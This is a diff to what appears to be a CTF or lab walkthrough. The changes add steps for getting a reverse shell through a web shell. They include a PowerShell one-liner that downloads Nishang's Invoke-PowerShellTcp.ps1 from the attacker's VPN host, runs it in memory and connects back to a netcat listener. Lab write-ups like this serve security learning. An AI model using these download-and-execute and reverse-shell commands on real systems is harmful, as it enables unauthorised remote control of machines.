@@ -55,13 +55,27 @@ Download the RAW file of this module:
 
 A goood approach is execute the reverseShell in memory, like Nishang project describe:
 
-*Method 1. Use the in-memory dowload and execute: Use below command to execute a PowerShell script from a remote shell, meterpreter native shell, a web shell etc. and the function exported by it. All the scripts in Nishang export a function with same name in the current PowerShell session.*
+"*Method 1. Use the in-memory dowload and execute: Use below command to execute a PowerShell script from a remote shell, meterpreter native shell, a web shell etc. and the function exported by it. All the scripts in Nishang export a function with same name in the current PowerShell session.*"
 
 The next line is used for this:
 
 ```ps
 powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
 ```
+
+Change the value necessary with your VPN IP address and port:
+
+```ps
+powershell iex (New-Object Net.WebClient).DownloadString('http://<YourVpnIP>:1234/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <YourVpnIP> -Port 1337
+```
+
+Configure a python server in port 1234 and netcat listening in the port 1337:
+
+<p align="center">https://user-images.githubusercontent.com/43796175/107417029-2cff9580-6ae3-11eb-979b-a16af27eb2cc.jpg"></p>
+
+Paste the code in the webShell and you recive the reverse connection:
+
+
 
 # 05: Post-Exploitation
 
